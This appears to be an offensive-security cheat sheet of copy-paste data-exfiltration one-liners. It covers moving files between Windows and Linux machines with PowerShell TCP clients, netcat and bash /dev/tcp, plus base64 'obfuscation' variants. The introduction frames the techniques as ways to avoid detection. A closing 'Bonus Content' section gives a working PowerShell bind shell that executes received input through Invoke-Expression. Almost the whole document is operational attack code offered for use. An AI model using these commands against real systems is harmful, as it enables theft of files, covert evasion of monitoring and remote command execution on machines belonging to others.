# Data Exfiltration Techniques
#### This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc. for some reason, are avoiding using them due to triggering certain detections, or just because you're feeling saucy.  I'm sure these can probably be made more efficient, but they were developed as part of a.) getting better at PowerShell, and b.) just to see if I could.

***

***

### Windows To Linux

<details>

<summary>Send a file from a remote Windows client to a local Linux host</summary>

#### Send a file from a *remote* Windows client to a *local* Linux host

![](./imgs/win-lin-rev.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

</details>

***

<details>

<summary>Retrieve a file from a remote Windows client to a local Linux host</summary>

#### Retrieve a file from a *remote* Windows client to a *local* Linux host

![](./imgs/win-lin-bind.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:

```
cat < /dev/tcp/%ListenerAddress%/%ListenerPort% > /path/to/store/file.ext
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:

```
cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
```

</details>

***

***

### Linux To Windows

<details>

<summary>Send a file from a remote Linux client to a local Windows host</summary>

#### Send a file from a *remote* Linux client to a *local* Windows host

![](./imgs/lin-win-rev.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:

```
cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:

```
base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

</details>

***

<details>

<summary>Retrieve a file from a remote Linux client to a local Windows host</summary>

#### Retrieve a file from a *remote* Linux client to a *local* Windows host

![](./imgs/lin-win-bind.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

</details>

***

***

### Linux To Linux

<details>

<summary>Send file from remote Linux client to local Linux host</summary>

#### Send file from *remote* Linux client to *local* Linux host

![](./imgs/lin-lin-rev.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp port > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:

```
cat /path/to/sending/file.ext > /dev/tcp/%ListenerAddress%/%ListenerPort%
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:

```
base64 -w0 /path/to/sending/file.ext > /dev/tcp/%ListenerAddress%/%ListenerPort%
```

</details>

***

<details>

<summary>Retrieve a file from a remote Linux client to a local Linux host</summary>

#### Retrieve a file from a *remote* Linux client to a *local* Linux host

![](./imgs/lin-lin-bind.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:

```
cat < /dev/tcp/%ListenerAddress%/%ListenerPort% > /path/to/store/file.ext
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:

```
cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
```

</details>

***

***

### Windows To Windows

<details>

<summary>Send file from remote Windows client to local Windows host</summary>

#### Send file from *remote* Windows client to *local* Windows host

![](./imgs/win-win-rev.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```
###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

</details>

***

<details>

<summary>Retrieve a file from a remote Windows client to a local Windows host</summary>

#### Retrieve a file from a *remote* Windows client to a *local* Windows host

![](./imgs/win-win-bind.png)

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:

```
& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close()}
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

</details>

***

***

<details>

<summary>Bonus Content</summary>

#### Bonus Content

##### PowerShell Bind Shell:

```
& {$LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTCPClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while (($RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {$Code = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); try {$Output = Invoke-Expression $Code 2>&1 | Out-String;} catch {$Output = $_.Exception.Message}; $Prompt = "PS $($PWD.Path)> "; $FullOutput = $Output + "`n" + $Prompt; $StreamWriter.Write($FullOutput); $Code = $null}; $TCPClient.Close(); $NetworkStream.Close(); $StreamWriter.Close(); $Listener.Stop()}
```

##### PowerShell Listener:

```
& {$LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); Write-Output "Listening on port $LPort..."; $TCPClient = $Listener.AcceptTCPClient(); Write-Output "Client connected."; $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while ($TCPClient.Connected) { try { $Input = Read-Host; $StreamWriter.Write($Input + "`n"); $Count = 0; if ($Input -eq "exit") { break } do { $NetworkStream.ReadTimeout = 50; $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($Data -eq 0) { break }; $Data = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); $Output = $Output + $Data } while ($NetworkStream.DataAvailable); Write-Output $Output; $Output = $null; $Data = $null } catch { continue } } $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop(); Write-Output "Connection closed."}
```

</details>
